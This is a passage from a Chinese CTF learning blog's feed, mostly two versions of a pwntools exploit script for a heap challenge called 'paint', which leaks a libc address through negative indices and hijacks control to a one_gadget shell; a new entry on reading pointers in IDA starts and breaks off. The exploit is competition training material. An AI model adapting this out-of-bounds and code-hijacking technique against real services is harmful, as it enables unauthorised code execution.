class=&#34;number&#34;&gt;0xf&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak=u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x1300&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase=leak-(&lt;span class=&#34;number&#34;&gt;0x7ffff7fad780&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x00007ffff7d93000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(leak)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr=libcbase+&lt;span class=&#34;number&#34;&gt;0x219098&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(-&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x222&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x08\x01&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;+p64(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#system=libcbase+libc.sym[&amp;#x27;/bin/sh\x00&amp;#x27;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;one=libcbase+&lt;span class=&#34;number&#34;&gt;0xebcf8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drow(-&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,p64(one))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;上述是修改过的,下面是队友原exp&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt;*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#elf=ELF(&amp;#x27;pwn&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p=process(&amp;#x27;./vuln&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p=process(&amp;#x27;./pwn&amp;#x27;,env=&amp;#123;&amp;#x27;LD_PRELOAD&amp;#x27;:&amp;#x27;./libc.so.6&amp;#x27;&amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;paint-71ae86dc10a3fe17.brics-ctf.ru&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;13003&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;,wid,hei&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter canvas width (1-255): &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(wid))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter canvas height (1-255): &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(hei))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;re&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;,wid,hei&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter new width (1-255): &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(wid))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter new height (1-255): &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.send(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(hei))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;drow&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;,data&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;` chars in `height` lines):&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;#for i in range(wid):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.send(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(data))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;4&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;,x,rate&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter rate: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ment (y/n): &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;y&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;r your comment: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(rate))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#edit(0,0x20,&amp;#x27;a&amp;#x27;*0x10)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#re(0,0x21,0x20)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#show(-8)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#add(1,1,0xf)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(&lt;span class=&#34;number&#34;&gt;0xf&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak=u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x1300&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase=leak-(&lt;span class=&#34;number&#34;&gt;0x7ffff7fad780&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x00007ffff7d93000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(leak)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#attach(p,&amp;#x27;b *0x00005555555557a3&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#delete(0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#add(0,0xf0,0xf0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr=libcbase+&lt;span class=&#34;number&#34;&gt;0x219098&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(-&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x222&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x08\x01&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;+p64(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#system=libcbase+libc.sym[&amp;#x27;/bin/sh\x00&amp;#x27;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;one=libcbase+&lt;span class=&#34;number&#34;&gt;0xebcf8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drow(-&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,p64(one))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

</content>
        <category term="PWN入门" />
        <updated>2023-09-28T09:27:01.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-41-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8C%87%E9%92%88%E8%AF%86%E5%88%AB/</id>
        <title>pwn入门-41-常见的指针识别</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-41-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8C%87%E9%92%88%E8%AF%86%E5%88%AB/"/>
        <content type="html">&lt;p&gt;​	在做题的时候, ida中很多指针看不懂,就很尴尬,需要再好好学习下, 不过还是多积累,遇到题目的时候每次都进行分析,后面就都慢慢熟悉了,(相应的可以根据反汇编代码写源代码,从开发、正向的角度来看)&lt;/p&gt;
&lt;h3 id=&#34;以一道题目为例子-学习下指针等&#34;&gt;&lt;a href=&#34;#以一道题目为例子-学习下指针等&#34; class=&#34;headerlink&#34; title=&#34;以一道题目为例子,学习下指针等&#34;&gt;&lt;/a&gt;以一道题目为例子,学习下指针等&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span 